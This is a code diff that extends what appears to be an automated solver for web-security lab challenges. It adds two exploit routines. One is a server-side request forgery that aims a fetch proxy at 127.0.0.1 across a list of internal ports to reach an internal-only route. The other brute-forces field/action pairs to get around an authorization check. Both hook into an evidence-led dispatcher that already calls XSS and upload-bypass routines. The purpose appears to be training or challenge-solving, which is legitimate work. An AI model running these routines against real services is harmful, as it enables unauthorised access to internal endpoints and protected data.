@@ -19,9 +19,9 @@ oracle), and never edit this shared tree from a worker's job.
 Mastery is cumulative: a target's bug class is never assumed from the challenge's
 own name. `classify_and_recover` tries each recognized class in the evidence-led
 order below (same order the restored day-19/day-20 dispatcher used, extended with
-the three classes day-21 added and the one day-22 added) and returns `None` if a
-target's evidence does not match anything known yet - that is a real signal for a
-new class, not a bug in this dispatcher.
+the three classes day-21 added, the one day-22 added, and the two day-24 added)
+and returns `None` if a target's evidence does not match anything known yet -
+that is a real signal for a new class, not a bug in this dispatcher.
 """
 import json
 import re
@@ -37,6 +37,10 @@ UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
 TIMEOUT = 30
 DELAY = 0.8  # polite pacing between requests to the same target, matching the restored notes
 PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
+# Common Kestrel / container-internal ports for rec_ssrf, tried in this order. 8080 is the
+# only one observed to succeed so far (three live day-24 variants); the rest are generic
+# fallbacks rather than a re-derived wordlist per attempt.
+SSRF_CANDIDATE_PORTS = (8080, 80, 5000, 5001, 8081, 3000, 8000, 4000, 8888, 443)
 
 
 class Links(HTMLParser):
@@ -309,6 +313,66 @@ def rec_upload_bypass(t, clues):
     return rendered.strip() if status == 200 else None
 
 
+def rec_ssrf(t, clues):
+    """`/api/clues` -> feature_route (a fetch proxy; takes an absolute `url` query
+    param and fetches it server-side) and secondary_route (an "internal_only"
+    endpoint on the SAME origin that refuses direct requests from outside the
+    host, checked by source IP, not by any header/cookie/token). Point
+    feature_route at `http://127.0.0.1:<port><secondary_route>` so the fetch
+    happens from the server's own loopback interface, which satisfies the
+    internal-only check; the response carries the proof. Only the internal TCP
+    port is unknown (8080 confirmed on every live variant seen so far); this
+    tries a short documented port list and stops at the first JSON response
+    carrying a `proof_<hex>`.
+    Source: day-15-fetch-quest (curriculum day 15, release day 24) - this
+    family's own bug (ASP.NET Core Minimal API)."""
+    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
+    if not feature or not secondary:
+        return None
+    for port in SSRF_CANDIDATE_PORTS:
+        internal_url = f"http://127.0.0.1:{port}{secondary}"
+        status, body = t.get_json(
+            feature + "?" + urllib.parse.urlencode({"url": internal_url}), save=f"ssrf_port_{port}")
+        if status == 200 and isinstance(body, dict):
+            match = PROOF_RE.search(json.dumps(body))
+            if match:
+                return match.group(0)
+    return None
+
+
+def rec_field_action_bypass(t, clues):
+    """`/api/clues` -> feature_route + inventory_route + protected_reference (a
+    generic "execute"-style endpoint whose authorization check is keyed to a
+    (field, action) pair inconsistently - e.g. `action=view` on the restricted
+    field is gated but `action=export` on the same field is not).
+    `inventory_route` discloses the exact fields/actions/query-parameter-name
+    grid to try, so this is brute-forceable without guessing: cross every field
+    with every action against the protected reference id and stop at the first
+    response that carries `evidence`.
+    Source: day-14-the-api-has-opinions (curriculum day 14, release day 24) -
+    this family's own bug ("WAR Room" / Jakarta Servlet app)."""
+    feature = clues.get("feature_route")
+    protected_id = clues.get("protected_reference")
+    if not feature or protected_id is None:
+        return None
+    inventory_route = clues.get("inventory_route", "/api/inventory")
+    status, inv = t.get_json(inventory_route, save="inventory")
+    if status != 200 or not inv:
+        return None
+    fields = inv.get("fields", ["title", "note"])
+    actions = inv.get("actions", ["view", "export"])
+    qp = inv.get("query_parameters", ["id", "fields", "action"])
+    id_param, fields_param, action_param = (qp + ["id", "fields", "action"])[:3]
+    for field in fields:
+        for action in actions:
+            query = urllib.parse.urlencode(
+                {id_param: protected_id, fields_param: field, action_param: action})
+            status, body = t.get_json(f"{feature}?{query}", save=f"grid_{field}_{action}")
+            if status == 200 and isinstance(body, dict) and "evidence" in body:
+                return body["evidence"]
+    return None
+
+
 def classify_and_recover(t, evidence=None):
     """Evidence-led dispatcher: GET / once, then try each recognized class in order.
 
@@ -340,6 +404,16 @@ def classify_and_recover(t, evidence=None):
         if clues.get("callback_nonce") and clues.get("feature_route") and clues.get("secondary_route"):
             evidence["classification"] = "reflected XSS + isolated browser callback"
             proof = rec_reflect_callback(t, clues)
+            if proof:
+                return proof
+        if clues.get("feature_route") and clues.get("secondary_route") and "inventory_route" not in clues:
+            evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
+            proof = rec_ssrf(t, clues)
+            if proof:
+                return proof
+        if clues.get("feature_route") and clues.get("inventory_route") and "protected_reference" in clues:
+            evidence["classification"] = "field/action authorization bypass"
+            proof = rec_field_action_bypass(t, clues)
             if proof:
                 return proof
         if clues.get("moderator_data_route") and clues.get("receipt_route_template"):
